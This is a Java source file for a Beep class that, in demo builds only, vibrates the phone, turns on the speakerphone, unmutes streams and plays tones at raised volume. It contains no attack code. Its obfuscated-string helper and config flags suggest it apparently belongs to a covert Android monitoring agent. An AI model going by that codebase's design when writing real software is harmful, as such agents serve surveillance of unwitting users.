package com.android.dvci;

import java.io.IOException;
import java.util.concurrent.Semaphore;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.media.ToneGenerator;
import android.net.Uri;
import android.os.Vibrator;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.Utils;
import com.android.mm.M;

public class Beep {
	private static final String TAG = "Beep";



	static public void playToneTest(int tone)
	{
		vibrate();

		AudioManager audioManager = (AudioManager)Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
		int maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_SYSTEM);
		//audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, maxVol, 0);
		maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_NOTIFICATION);
		audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, maxVol, 0);
		//maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_DTMF);
		//audioManager.setStreamVolume(AudioManager.STREAM_DTMF, maxVol, 0);
		if(!audioManager.isSpeakerphoneOn()){
			//Status.self().makeToast(M.e("speaker is OFF!!!! setting ON"));
			audioManager.setSpeakerphoneOn(true);
			audioManager.setStreamMute(AudioManager.STREAM_NOTIFICATION,false);
			audioManager.setStreamMute(AudioManager.STREAM_SYSTEM,false);
			audioManager.setStreamMute(AudioManager.STREAM_DTMF,false);
			audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
			audioManager.setStreamVolume(AudioManager.STREAM_RING, 20, 0);
		}

		ToneGenerator tg = new ToneGenerator(AudioManager.STREAM_NOTIFICATION, ToneGenerator.MAX_VOLUME);
		for (int i=0 ; i<maxVol; i+=1) {
			audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, i, 0);
			audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, i, 0);
			audioManager.setStreamVolume(AudioManager.STREAM_DTMF, i, 0);
			tg.startTone(tone);
			Utils.sleep(500);
		}
		audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 20, 0);
		audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, 20, 0);
		audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 20, 0);

		tg.startTone(tone);
	}
	static public void playTone(int tone)
	{
		vibrate();
		AudioManager audioManager = (AudioManager)Status.getAppContext().getSystemService(Context.AUDIO_SERVICE);
		//audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, 20, 0);
		if(!audioManager.isSpeakerphoneOn()){
			//Status.self().makeToast(M.e("speaker is OFF!!!! setting ON"));
			audioManager.setSpeakerphoneOn(true);
			audioManager.setStreamMute(AudioManager.STREAM_NOTIFICATION,false);
			audioManager.setStreamMute(AudioManager.STREAM_SYSTEM,false);
			audioManager.setStreamMute(AudioManager.STREAM_DTMF,false);
			audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
			audioManager.setStreamVolume(AudioManager.STREAM_RING, 20, 0);
		}
		audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 20, 0);
		audioManager.setStreamVolume(AudioManager.STREAM_SYSTEM, 20, 0);
		audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 20, 0);
		//audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 20, 0);

		ToneGenerator tg = new ToneGenerator(AudioManager.STREAM_NOTIFICATION, ToneGenerator.MAX_VOLUME);
		tg.startTone(tone);
	}

	static public void vibrate(){
		try {
			Vibrator v = (Vibrator) Status.getAppContext().getSystemService(Context.VIBRATOR_SERVICE);
			v.vibrate(300);
		}catch(Exception ex){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (playSound), ERROR: " + ex);
			}
		}
	}

	public static void bip() {
		if (Cfg.DEMO) {
			playTone(ToneGenerator.TONE_CDMA_KEYPAD_VOLUME_KEY_LITE);
		}
	}

	public static void beep() {
		if (Cfg.DEMO) {
			playTone(ToneGenerator.TONE_PROP_BEEP);
		}
	}
	public static void beep_test() {
		if (Cfg.DEMO) {
			//playToneTest(ToneGenerator.TONE_CDMA_KEYPAD_VOLUME_KEY_LITE);
			//playToneTest(ToneGenerator.TONE_CDMA_ABBR_ALERT);
			playToneTest(ToneGenerator.TONE_CDMA_EMERGENCY_RINGBACK);
		}
	}


	public static void beepPenta() {
		if (Cfg.DEMO) {

			playTone(ToneGenerator.TONE_PROP_BEEP2);
		}
	}
	
	public static void beepExit() {
		if (Cfg.DEMO) {
			playTone(ToneGenerator.TONE_PROP_PROMPT);
		}
	}
}
